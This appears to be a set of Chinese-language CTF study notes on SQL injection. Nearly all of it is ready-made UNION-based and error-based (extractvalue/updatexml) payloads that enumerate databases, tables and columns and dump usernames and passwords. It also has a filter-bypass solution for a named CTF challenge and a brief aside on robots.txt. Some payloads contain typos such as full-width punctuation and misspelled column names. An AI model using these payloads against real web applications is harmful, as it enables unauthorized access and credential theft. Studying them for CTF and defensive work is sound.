<!-- this is test; -->
### 4:union注入（适合有回显，例如输入1=1和1=2会有不同的回显）  
判断表字段数
?id=1' order by 3--+
判断回显位
?id=1' union select 1,2,3#
爆库
union select 1,2,group_concat(schema_name) from information_schema.schemata --+
爆表
union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名'--+
爆列名
union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' --+
爆数据
id=-1' union select 1,2,group_concat(username,password) from 表名 --+

### 5：报错注入（数据库的报错有明显回显）

extractvalue() 函数

获取数据库名称及版本信息
?id=1' and extractvalue(1,concat(0x7e,database(),0x7e，version(),0x7e)) --+  
查库名  
'^extractvalue(1,concat(0x7e,(select(database()))))%23  
获取当前数据库位置  
?id=1' and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+  
爆列  
?id=1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='表名' limit 0,1),0x7e)) --+  
爆数据  
?id=1' and extractvalue(1,concat(0x7e,（select usename from users limit 0,1),0x7e)) --+  
爆表  
1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek'))))  

updatexml() 函数\

爆库名  
?id=1' and updatexml(1,concat(0x7e,(database()),0x7e),1) --+  
爆表名  
?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='库名' limit 0,1 ),0x7e),1) --+  
爆列名  
?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='表名' and table_schema='库名' limit 0,1 ),0x7e),1) --+  
爆数据  
?id=1' and updatexml(1,concat(0x7e,（select group_concat(usename,password) from 表名 limit 0,1),0x7e)) --+  

报错注入真实（buu hardsql）(过滤了空格和union和等号)  

1'^updatexml(1,concat(0x7e,(database()),0x7e),1)#
/check.php?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek')))))#  
1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))))#  

extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))  

**robots.txt， robots.txt是一个协议,我们可以把它理解为一个网站的"管家",它会告诉搜索引擎哪些页面可以访问,哪些页面不能访问。也可以规定哪些搜索引擎可以访问我们的网站而哪些搜索引擎不能爬取我们网站的信息等等**

seliaze序列化与反序列化